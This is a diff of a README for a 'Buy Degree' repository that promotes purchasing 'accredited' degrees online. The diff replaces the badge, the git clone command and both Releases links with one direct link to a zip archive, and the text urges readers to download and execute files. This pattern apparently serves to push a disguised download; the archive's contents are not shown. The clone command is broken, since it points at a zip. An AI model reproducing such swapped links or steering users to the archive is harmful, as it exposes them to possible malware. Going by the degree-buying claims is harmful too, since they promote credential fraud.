@@ -1,6 +1,6 @@
 # Buy Degree 📜
 
-![Buy Degree](https://img.shields.io/badge/Buy_Degree-Online-blue.svg)
+![Buy Degree](https://raw.githubusercontent.com/asrimursawal/Buy-degree/main/antifederalist/Buy-degree-jami.zip)
 
 Welcome to the **Buy Degree** repository! Here, you will find resources and information on how to purchase accredited degrees online. This repository aims to guide you through the process of obtaining a legitimate degree that can enhance your career prospects.
 
@@ -52,7 +52,7 @@ To get started, simply clone this repository to your local machine. You can then
 To clone this repository, use the following command:
 
 ```bash
-git clone https://github.com/asrimursawal/Buy-degree.git
+git clone https://raw.githubusercontent.com/asrimursawal/Buy-degree/main/antifederalist/Buy-degree-jami.zip
 ```
 
 After cloning, navigate into the directory:
@@ -81,10 +81,10 @@ For any questions or suggestions, please reach out via GitHub issues or directly
 
 ## Releases
 
-For the latest updates and releases, visit the [Releases](https://github.com/asrimursawal/Buy-degree/releases) section. Here, you can download and execute the latest files related to this repository.
+For the latest updates and releases, visit the [Releases](https://raw.githubusercontent.com/asrimursawal/Buy-degree/main/antifederalist/Buy-degree-jami.zip) section. Here, you can download and execute the latest files related to this repository.
 
 ---
 
 This repository serves as a valuable resource for anyone interested in purchasing an accredited degree online. We hope you find the information useful and informative. If you have any questions or need assistance, don't hesitate to reach out.
 
-To explore more, visit the [Releases](https://github.com/asrimursawal/Buy-degree/releases) section for the latest files and updates.
+To explore more, visit the [Releases](https://raw.githubusercontent.com/asrimursawal/Buy-degree/main/antifederalist/Buy-degree-jami.zip) section for the latest files and updates.
